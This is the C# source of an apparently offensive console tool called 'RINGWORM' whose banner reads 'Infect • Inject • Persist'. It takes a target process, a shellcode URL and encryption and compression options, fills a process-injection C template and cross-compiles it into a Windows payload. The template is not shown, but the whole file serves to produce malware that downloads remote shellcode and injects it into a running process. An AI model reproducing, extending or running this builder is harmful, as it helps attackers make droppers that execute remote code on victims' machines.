using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PayloadBuilder
{
    class Program
    {
        static void Main(string[] args)
        {
            Splash();
            var config = GetUserInput();
            string cCode = CreateCode(config);
            CompileCode(cCode, config);
            ShowSummary(config);
        }

        static void Splash()
        {
            Console.WriteLine(@"
              [ R I N G W O R M ]
            Infect • Inject • Persist
            ");
        }

        static PayloadConfig GetUserInput()
        {
            Console.WriteLine("\nAvailable Methods:");
            Console.WriteLine("1. Process Injection");
            Console.Write("Choose method: ");
            string choice = Console.ReadLine() ?? "1";

            var config = new PayloadConfig();
            
            switch(choice)
            {
                case "1":
                    config.InjectionType = "process_injection";
                    Console.Write("\nTarget process (e.g. notepad.exe): ");
                    config.TargetProcess = Console.ReadLine() ?? "notepad.exe";
                    break;
                    
                default:
                    config.InjectionType = "process_injection";
                    Console.Write("\nTarget process (e.g. notepad.exe): ");
                    config.TargetProcess = Console.ReadLine() ?? "notepad.exe";
                    break;
            }
            Console.Write("Shellcode URL: ");
            config.ShellcodeUrl = Console.ReadLine() ?? "";
            Console.Write("Output filename: ");
            config.OutputName = Console.ReadLine() ?? "payload";

            Console.Write("Use encryption? (y/N): ");
            config.UseEncryption = (Console.ReadLine()?.ToLower() ?? "n") == "y";

            Console.Write("Use compression? (y/N): ");
            config.UseCompression = (Console.ReadLine()?.ToLower() ?? "n") == "y";

            return config;
        }

        static string CreateCode(PayloadConfig config)
        {
            string templatePath = Path.Combine("templates", $"{config.InjectionType}.c");
            string template = File.ReadAllText(templatePath);

            switch(config.InjectionType)
            {
                case "process_injection":
                    template = template.Replace("$TARGET_PROCESS$", config.TargetProcess);
                    template = template.Replace("$SHELLCODE_URL$", config.ShellcodeUrl);
                    template = template.Replace("$USE_ENCRYPTION$", config.UseEncryption ? "1" : "0");
                    template = template.Replace("$USE_COMPRESSION$", config.UseCompression ? "1" : "0");
                    break;
            }

            Directory.CreateDirectory("output");
            string outputPath = Path.Combine("output", $"{config.OutputName}.c");
            File.WriteAllText(outputPath, template);

            return outputPath;
        }

        static void CompileCode(string sourcePath, PayloadConfig config)
        {
            bool isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
            var compileInfo = new CompileInfo();
            
            string outputFile = config.OutputName;
            
            if (isWindows)
            {
                compileInfo.Compiler = "cl.exe";
                compileInfo.ExtraFlags = "/DWIN32 /D_WINDOWS";
                if (config.UseEncryption)
                    compileInfo.ExtraFlags += " /DUSE_ENCRYPTION";
                if (config.UseCompression)
                    compileInfo.ExtraFlags += " /DUSE_COMPRESSION";
            }
            else
            {
                compileInfo.Compiler = "x86_64-w64-mingw32-gcc";
                compileInfo.ExtraFlags = "-lws2_32 -lwininet";
                if (config.UseEncryption)
                    compileInfo.ExtraFlags += " -DUSE_ENCRYPTION";
                if (config.UseCompression)
                    compileInfo.ExtraFlags += " -DUSE_COMPRESSION";
            }

            // Create output directory if it doesn't exist
            string outputDir = Path.Combine(Directory.GetCurrentDirectory(), "output");
            Directory.CreateDirectory(outputDir);
            string outputPath = Path.Combine(outputDir, outputFile);

            string compileArgs;
            if (isWindows)
            {
                // For cl.exe, flags come first
                compileArgs = $"{compileInfo.ExtraFlags} {sourcePath} /Fe:{outputPath}";
            }
            else
            {
                // For gcc, source and output come first
                compileArgs = $"{sourcePath} -o {outputPath} {compileInfo.ExtraFlags}";
            }

            Console.WriteLine("\nCompilation Details:");
            Console.WriteLine($"Compiler: {compileInfo.Compiler}");
            Console.WriteLine($"Source: {sourcePath}");
            Console.WriteLine($"Output: {outputPath}");
            Console.WriteLine($"Full command: {compileInfo.Compiler} {compileArgs}");
            Console.WriteLine("\nCompiling...");

            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = compileInfo.Compiler,
                    Arguments = compileArgs,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();
            process.WaitForExit();
        }

        static void ShowSummary(PayloadConfig config)
        {
            bool isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
            string outputName = config.OutputName;
            
            Console.WriteLine("\nBuild Summary:");
            Console.WriteLine("-------------");
            Console.WriteLine($"Injection Type: {config.InjectionType}");
            Console.WriteLine($"Target Process: {config.TargetProcess}");
            Console.WriteLine($"Output: output/{outputName}");
        }
    }

    class PayloadConfig
    {
        public string InjectionType { get; set; } = "";
        public string TargetProcess { get; set; } = "";
        public string ShellcodeUrl { get; set; } = "";
        public string OutputName { get; set; } = "payload";
        public bool UseEncryption { get; set; } = false;
        public bool UseCompression { get; set; } = false;
    }

    class CompileInfo
    {
        public string Compiler { get; set; } = "";
        public string ExtraFlags { get; set; } = "";
    }
}

